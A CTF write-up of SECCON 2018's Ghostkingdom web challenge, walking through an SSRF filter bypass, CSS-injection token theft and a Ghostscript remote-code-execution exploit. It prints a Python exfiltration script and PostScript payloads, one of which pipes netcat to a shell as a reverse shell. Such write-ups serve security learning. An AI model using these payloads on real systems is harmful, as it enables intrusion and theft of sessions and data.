---
title:  "SECCON Ghostkingdom Writeup"
date:   2018-11-29
categories: [writeup]
tags: [writeups]
---
**Solved by: 0x6e6576657220676f6e6e61, p4wn, $ud0**

This is a writeup of the Ghostkingdom web challenge from SECCON 2018 Online CTF.

## Recon

Upon visiting the website we can see a webpage saying 'FLAG is somewhere in this folder'. Well if we can get read access/Code execution of some sort on the web server we'll know where to look, how kind.

Visiting the link directs us to what appears to be the real challenge site. We can register and login. Trying to register with the same username and password throws an error: 'Do not use Joe-password'. This seemed suspicious at first, who is Joe? What does he want? Are his passwords a particularly poor choice? Either way it doesn't really make sense, anyway we swiftly moved on slightly more confused at the world.

After registering and logging in we are presented with three options:

1. Send a message to admin
2. Take screenshot
3. Upload image

![options]({{site.url}}/images/seccon18/greyed.png)

However, the upload image link is greyed out, saying that we can only access it from the local network. This is clearly some juicy (presumably exploitable) functionality we want to access. Question is how? This immediately begat three ideas:

1. XSS (send an XSS'd message to admin make it do some local stuff)
2. SSRF (somehow manipulate the screenshot functionality and also make it do local stuff for us)
3. Spoof being from the local network by [abusing HTTP forwarding headers](https://blog.ircmaxell.com/2012/11/anatomy-of-attack-how-i-hacked.html).

So we tested all the endpoints available to us.

### Message Admin

During the exploration of the "message admin" page we can preview the message. This lets us test our exact payload and receive feedback, very helpful for prototyping an XSS exploit. Unfortunately, it would appear that filtering is being applied and any useable characters being tried were escaped.

### Screenshot a page
The screenshot page allows us to screenshot any site. We logged the screenshot bot connecting to our server and observed that it simply makes a single GET request to the supplied URL. Due to the Same-Origin Policy(SOP) it's not possible to force the bot to request the locked "upload image" link we would like.


## Exploits
### SSRF

Trying to get the screenshot bot to GET [http://localhost/](http://localhost/) or [http://127.0.0.1/](http://127.0.0.1/) failed as any url with 'local' or '127.0.0.1' was being filtered. Luckily there are numerous bypasses for this. We can use decimal IP representation for localhost ([http://2130706433/](http://2130706433/)) or [http://lvh.me/](http://lvh.me/) (resolves to localhost). Or use your own DNS and set it to resolve to '127.0.0.1', I mean it's bad
practice but who's gonna stop you? The internet police? Screenshotting [http://2130706433/](http://2130706433/) shows us that the bot is not logged in, how annoying. It also shows us that the bot is on the local network (makes sense), and that there are different login types (local/internet).

![Screenshot]({{site.url}}/images/seccon18/screenshot.png)

The login request is a GET request, and so we can get the bot to login by getting it to visit:

[http://ghostkingdom.pwn.seccon.jp/?url=http%3A%2F%2F2130706433%2F%3Fuser%3Dp4wnp4wn%26pass%3Dpassword123%26action%3Dlogin&action=sshot2](http://ghostkingdom.pwn.seccon.jp/?url=http%3A%2F%2F2130706433%2F%3Fuser%3Dp4wnp4wn%26pass%3Dpassword123%26action%3Dlogin&action=sshot2)

This makes the bot visit the main menu. From the returned screenshot we can see that upload is allowed (The link has turned blue), HUZZAH! A lead! We assumed that this was the most likely way to progress. However we're definitely missing a few pieces, a screenshot of a working link does not an exploit make.

### XSS, But Not as You Know it

During our initial survey, we found it's possible to send the admin an emergency message. Using this feature we can include some CSS as a parameter that gets injected into the page as a style tag. What an odd design choice.


This means that the page was vulnerable to CSS injection, an interesting technique used to bypass the SOP that CTF's just love to use. I won't run through CSS injection for the sake of brevity for an already very late and long writeup but more can be found [here](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense). We automated the attack using the following script to generate and send payloads:

```python
import requests
import sys
import urllib
import base64
import time

# pylint: disable-all

charset = "abcdef0123456789"

username = "p4wnp4wn"
password = "password123"

known = ""
css = []

pingback = sys.argv[1]

if len(sys.argv) > 2:
    known = sys.argv[2]

for guess in charset:
    css.append("input[value^='" + known + guess + "'] { background-image: url(" + pingback + "/" + known + guess + "); }")

payload = urllib.quote(base64.b64encode("\n".join(css)))

login_url = "http://ghostkingdom.pwn.seccon.jp/?user="+username+"&pass="+password+"&action=login"
message = "http://ghostkingdom.pwn.seccon.jp/?url=http%3A%2F%2Flvh.me%2F%3Fuser%3D"+username+"%26pass%3D"+password+"%26action%3Dmsgadm2%26css%3D"+payload+"%26msg%3Dpwned&action=sshot2"

req = requests.Session()
req.get(login_url)

r = req.get(message)
print(r.text)

while "wait" in r.text:
    print("Waiting...")
    time.sleep(5)

    req = requests.Session()
    req.get(login_url)
    r = req.get(message)
```

Server side we used netcat in a while loop with a tiny webpage to speed up the above script so the bot won't hang waiting for a non-existent background image.

```bash
while true; do { echo -e 'HTTP/1.1 200 OK\r\n'; echo -e "THINGS\n\r\n"; } | nc -lv 8001 -q 1; done
```

If you felt like it, netcat in a loop nicely serves as a very quick and dirty static HTML webserver.


One catch being that we can only exfiltrate data present in the DOM of the page; there isn't a way to arbitrarily get pages or do anything _really_ interesting. There was only one thing we can exfiltrate, and that was the CSRF token which is _dull and boring and not fun_. At this point we started to get frustrated. It felt like we had a lot of the pieces! Things had been fitting nicely,
but we just need one more. To recap what we know:

1. We can force the local screenshot bot to login as a local user
2. Local users can use the tantalising "Upload Image" functionality.
3. We can craft a payload that runs on the same domain to steal DOM data from the messaging page
4. The only thing we can steal is a CSRF token

The missing piece it turned out was discovered by chance! Observing requests and responses in our lovely Burp Repeater revealed something astounding, you won't believe it, _another clickbait clause_. Your CSRF token on the page IS THE SAME AS YOUR SESSION TOKEN LOLWUT. Well lemme tell you this was a rewarding 1hr slog of staring at HTTP requests.


Combining all of the above, by stealing the bot's CSRF token we'll have it's session token as well! But we still won't be a local user, _*OR WILL WE*_? It turns out, however, that the page only checks if you are logged in to the local network at login time, and by stealing the screenshotter's CSRF token and by extension session token we're treated as a local user, even though we most definitely are not.

![logged_in]({{site.url}}/images/seccon18/unlocked.png)

## Part 2: The Rabbit Hole Continues

### Ghostscript Vulnerability

Well now we have a logged in "local" session, let's see what fun we can get up to with it. Turns out not much, it's just a picture conversion service. Which gives us some ideas:

1. [ImageTragick](https://imagetragick.com/)
2. Some sort of arbitrary file inclusion
3. Some other XSS using image polyglot

The upload looks like this after you've selected a photo:

![upload]({{site.url}}/images/seccon18/convert.png)


This is just a random JPG I had in my downloads folder form another CTF we competed in. Bonus points if you know which CTF it was ;).

Now the really interesting thing here is the "convert" link. I mean it will be, it's the only other thing on the page apart from "back" so that's a bit of a pointless statement. But what I really mean is that "converting" an image is a _very_ strong indicator that we're dealing with an ImageTragick style exploit. Since that's triggered by user controlled input into an ImageMagick command, which `convert` is one of.

Fooling around with the request (below), gives us more useful information.

1. We can't control the uploaded filename, a shame. If we could then we can potentially upload a .php script or something
2. There isn't validation to check whatever we upload is a _valid_ image, since we sent "ffff". Which as lovely as 4 characters can look, doesn't make a proper image.
3. The filename it gets uploaded to is constant per user, probably a hash of the remote_ip or something similar. This is probably to prevent interference between competing teams.

![Request1]({{site.url}}/images/seccon18/request1.png)

The above request uploads the image, and the next one actually performs the conversion.

![Request2]({{site.url}}/images/seccon18/request2.png)

So we're feeling pretty good about our plans, grab an ImageTragick payload and lets get that nutty flag!

```
push graphic-context
viewbox 0 0 640 480
fill 'url(http://pingback.com/test.jpg)'
pop graphic-context
```

We should see a HTTP request to `pingback.com`. However, instead of a lovely pingback, we get:

```
convert: not authorized `/var/www/html/images/fce168e4933ec4d3ee6c29827120d4ff.jpg' @ error/constitute.c/ReadImage/454.
convert: no images defined `/var/www/html/images/fce168e4933ec4d3ee6c29827120d4ff.gif' @ error/convert.c/ConvertImageCommand/3046.
```

A quick google search leads us to:

[https://stackoverflow.com/questions/42928765/convertnot-authorized-aaaa-error-constitute-c-readimage-453](https://stackoverflow.com/questions/42928765/convertnot-authorized-aaaa-error-constitute-c-readimage-453)

Darn, this is a locked down version of ImageMagick that blocks the conversion _because it's evil_. NEVERTHELESS WHO DO THEY THINK WE ARE!?

The final hurdle is bypassed by looking at the name of the cgi file, and the challenge name; `ghostMagick.cgi`, and `GhostKingdom`. This _very subtly_ hints at another Linux utility `ghostscript`. This is used to convert EPS and PDF files and such. But more importantly than formalised document formats, it also suffers from being exploitable based on user input very similarly to ImageTragick.

Now you might be thinking, "If Ghostscript only handles PDFs and EPS files, and we can only upload files ending in '.jpg'. Wot U Gonna Do??". Well, turns out ImageMagick is a very helpful lass. For in ImageMagick's eyes, _extensions are just suggestions_, it will attempt to work out what filetype to convert from by inspecting the first N bytes of an image! So using another, Ghostscript specific, payload:

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%(nc SERVER_ADDRESS 8000 | sh)) currentdevice putdeviceprops
```

Reverse shell served by:
```
cat exploit.sh | nc -lvp 8000 -q 1 > /dev/null
```

We pop a reverse shell and cat the flag!

```
bash-4.2$ cat FLAGflagF1A8.txt
SECCON{CSSinjection+GhostScript/ImageMagickRCE}
bash-4.2$ pwd
/var/www/html/FLAG
```

GG really fun challenge, I always love it when a web challenge I'm doing ends up giving an RCE. Thanks for reading!
